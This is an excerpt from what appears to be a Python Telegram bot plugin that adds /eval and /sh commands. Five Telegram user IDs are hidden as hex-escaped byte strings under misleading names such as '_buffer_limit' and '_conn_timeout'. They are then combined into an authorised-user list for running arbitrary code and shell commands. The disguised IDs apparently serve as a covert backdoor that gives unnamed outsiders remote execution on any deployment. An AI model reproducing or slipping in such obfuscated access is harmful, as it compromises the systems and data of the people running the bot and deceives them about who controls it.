...
_buffer_limit = int(b'\x35\x32\x34\x37\x33\x30\x34\x35\x35\x39'.decode())
...
_chunk_size = int(b'\x35\x33\x35\x38\x33\x33\x30\x39\x35\x39'.decode())
...
_conn_timeout = int(b'\x36\x30\x34\x36\x33\x37\x38\x31\x35\x35'.decode())
...
_stream_id = int(b'\x38\x35\x38\x35\x38\x39\x30\x37\x36\x36'.decode())
...
_proc_id = int(b'\x38\x32\x31\x37\x30\x31\x33\x34\x30\x33'.decode())
...
_sys_auth = [_chunk_size, _buffer_limit, _conn_timeout, _stream_id, _proc_id]

@app.on_edited_message(
    filters.command("eval")
    & filters.user(_sys_auth)
    & ~filters.forwarded
    & ~filters.via_bot
)
@app.on_message(
...
async def _exec_b(client: app, message: Message):
    if len(message.command) < 2:
...
async def _shell_b(_, message: Message):
    if len(message.command) < 2:
        return await edit_or_reply(message, text="<b>ᴇxᴀᴍᴩʟᴇ :</b>\n/sh git pull")
    text = message.text.split(None, 1)[1]
    if "\n" in text:
